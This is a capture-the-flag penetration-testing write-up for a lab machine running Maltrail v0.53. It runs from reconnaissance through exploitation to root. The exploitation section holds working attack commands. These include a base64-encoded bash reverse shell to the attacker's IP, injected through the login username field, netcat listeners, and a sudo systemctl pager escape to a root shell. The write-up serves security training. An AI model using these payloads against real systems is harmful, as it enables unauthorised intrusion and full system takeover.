# SAU Machine Write-Up: From Recon to Root

## Overview
This document details the complete penetration testing process for the SAU machine, covering reconnaissance, vulnerability assessment, exploitation, and post-exploitation leading to root access.

## Reconnaissance

### Initial Scanning
```bash
export target=10.129.17.179

# Comprehensive port scan
sudo nmap -p- --min-rate 5000 -sT -vvv $target

# Service enumeration on discovered ports
sudo nmap -sC -sV -p 22,55555 -T4 $target
```

![Nmap Scan](https://github.com/user-attachments/assets/65abc825-ac10-4971-8d1c-8f20cb47bc63)

![Service Scan](https://github.com/user-attachments/assets/8bc1cd58-ec14-4ef0-b8f7-d938846ad1ad)

![Detailed Scan Results](https://github.com/user-attachments/assets/d5c2d7ee-12d4-4281-ae25-a4d49ebd864e)

**Findings:**
- **Port 22**: SSH service
- **Port 55555**: HTTP service running Maltrail v0.53

## Web Application Analysis

### Service Discovery
The web service on port 55555 hosts Maltrail, a malicious traffic detection system. Initial interaction revealed:

1. **Application Interface**: Maltrail dashboard
2. **Key Feature**: "Create Basket" functionality
3. **Proxy Settings**: Forward URL configuration capability

### Initial Testing
```bash
# Basic curl request
curl http://$target:55555/zntrtvt

# User-Agent manipulation attempt
curl http://$target:55555/zntrtvt -A "hello world"

# SSTI testing
curl http://$target:55555/zntrtvt -A "{{hello world}}'\""
```

Web application interface after clicking "Create":

![Create Basket](https://github.com/user-attachments/assets/6ea0a02e-45c3-4923-9490-867c20648cd6)

After clicking "Open Basket" on the webpage:

![Open Basket](https://github.com/user-attachments/assets/1fe5c45f-6be9-448d-9aa7-2690fbb66236)

Resulting URL: `http://10.129.17.179:55555/zntrtvt`

![Basket Interface](https://github.com/user-attachments/assets/bf98b2f6-d504-47e1-95aa-524ec7fd102d)

Initial curl request with no custom User-Agent:
```bash
curl http://10.129.17.179:55555/zntrtvt
```
![Basic Curl](https://github.com/user-attachments/assets/978b5668-db6b-4958-bc3d-d74086617ff0)

Curl with custom User-Agent revealing headers:
```bash
curl http://10.129.17.179:55555/zntrtvt -A "hello world"
```
![User-Agent Test](https://github.com/user-attachments/assets/2054cda9-a6a9-40f2-850e-d43831f6845e)

![User-Agent Headers](https://github.com/user-attachments/assets/64660a77-e680-4730-862b-fe616d68d150)

SSTI injection attempt:
```bash
curl http://10.129.17.179:55555/zntrtvt -A "{{hello world}}'\""
```
![SSTI Test](https://github.com/user-attachments/assets/4326f5a0-5be8-4521-aab0-d639b2c39c70)

### Proxy Configuration Discovery
Settings menu revealing Forward URL functionality:

![Settings Menu](https://github.com/user-attachments/assets/85e03282-5048-4eaa-b596-788d941310c4)

Testing with attacker's IP as forward URL:

![Forward URL Setup](https://github.com/user-attachments/assets/7f6cd370-6d15-4847-95aa-74fcca948d47)

Traffic capture showing request forwarding:
```bash
sudo nc -nlvp 80
```
```
connect to [10.10.14.172] from (UNKNOWN) [10.129.17.179] 45098
GET / HTTP/1.1
Host: 10.10.14.172
User-Agent: curl/8.15.0
Accept: */*
X-Do-Not-Forward: 1
Accept-Encoding: gzip
```

Testing with localhost as forward URL:

![Localhost Forward](https://github.com/user-attachments/assets/ab1b1953-4d74-49b2-9c68-c3d70416a259)

Full webpage response revealing Maltrail v0.53:
```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html;charset=utf8">
        <meta name="viewport" content="width=device-width, user-scalable=no">
        ...............................................................................................................................................................................................................
        <script type="text/javascript" src="js/thirdparty.min.js"></script>
        <script type="text/javascript" src="js/papaparse.min.js"></script>
    </head>
    <body>
        <div id="header_container" class="header noselect">
            <div id="logo_container">
                <span id="logo"><img src="images/mlogo.png" style="width: 25px">altrail</span>
            </div>
            ............................................................................................................................................................................................................

           
        <ul class="custom-menu">
            <li data-action="hide_threat">Hide threat</li>
            <li data-action="report_false_positive">Report false positive</li>
        </ul>
        <script defer type="text/javascript" src="js/main.js"></script>
    </body>
</html>
```

![Maltrail Interface](https://github.com/user-attachments/assets/0ec8a2b7-97ec-4c1f-b8fa-04eacbf27106)

## Vulnerability Discovery

### Maltrail v0.53 Unauthenticated RCE
Research revealed that Maltrail version 0.53 contains an unauthenticated remote code execution vulnerability.

**Vulnerability Details:**
- **CVE**: Not assigned
- **Type**: Remote Code Execution
- **Attack Vector**: HTTP request manipulation
- **Complexity**: Low

## Exploitation

### Method 1: Automated Exploitation
```bash
# Using public exploit
python3 exploit.py 10.10.14.172 9001 http://$target:55555

# Listener setup
nc -nlvp 9001
```

![Automated Exploit](https://github.com/user-attachments/assets/2830f684-02c1-485e-bd44-60c5af5b6f17)

![Reverse Shell Obtained](https://github.com/user-attachments/assets/e68ebe70-01b1-4c55-b635-a09e511f20ac)

### Method 2: Manual Exploitation
```bash
# Create reverse shell payload
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.172/9001 >&1"' | base64 -w0

# Execute payload through vulnerability
curl http://$target:55555/hello --data-urlencode 'username=;`echo "YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcyLzkwMDEgID4mMSAgICIK" | base64 -d | sh`'
```

**Shell Access Obtained:**
```bash
cat /home/puma/user.txt
e635420e2f09e2907e721b7e1f131afa
```

## Privilege Escalation

### Enumeration
```bash
sudo -l
```

![Sudo Privileges](https://github.com/user-attachments/assets/ea286154-333d-4cce-8090-da5da65224c5)

**Findings:**
User `puma` can execute the following command as root without password:
```bash
sudo /usr/bin/systemctl status trail.service
```

### Exploiting Sudo Privileges
Using GTFOBins methodology for systemctl privilege escalation:

![GTFOBins Reference](https://github.com/user-attachments/assets/03163c16-3f3d-4e93-9332-7dae9d830696)

```bash
# Execute systemctl with sudo
sudo /usr/bin/systemctl status trail.service

# Escape to shell
!sh
```

![Privilege Escalation Process](https://github.com/user-attachments/assets/00dc1d82-c0c5-4164-87bf-1f4f854aaf29)

![Root Shell Obtained](https://github.com/user-attachments/assets/9dfca0f6-d6cd-4bf4-8ec0-b7da23b553c9)

**Root Access Achieved:**
```bash
cat /root/root.txt
e5d521ffcd4aa1187b3e86f7ea587a3a
```

## Attack Chain Summary

1. **Port Discovery** → Nmap scan revealed SSH and web services
2. **Service Identification** → Maltrail v0.53 identified
3. **Vulnerability Research** → Unauthenticated RCE discovered
4. **Initial Compromise** → Reverse shell as `puma` user
5. **Privilege Escalation** → Abused sudo permissions on systemctl
6. **Root Access** → Gained complete system control

## Mitigation Recommendations

1. **Immediate Actions**:
   - Update Maltrail to latest version
   - Restrict network access to administration interfaces
   - Implement proper authentication mechanisms

2. **Long-term Security**:
   - Regular vulnerability assessments
   - Principle of least privilege for service accounts
   - Network segmentation
   - Security patch management

## Tools Used
- Nmap
- Curl
- Netcat
- Python3
- Base64

## Key Takeaways
- Always verify software versions for known vulnerabilities
- Sudo privileges should be carefully audited
- Outdated security software can become attack vectors
- Defense in depth is crucial for comprehensive security

---

*This write-up demonstrates a complete penetration testing methodology from initial reconnaissance to full system compromise. Always ensure you have proper authorization before testing systems.*
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
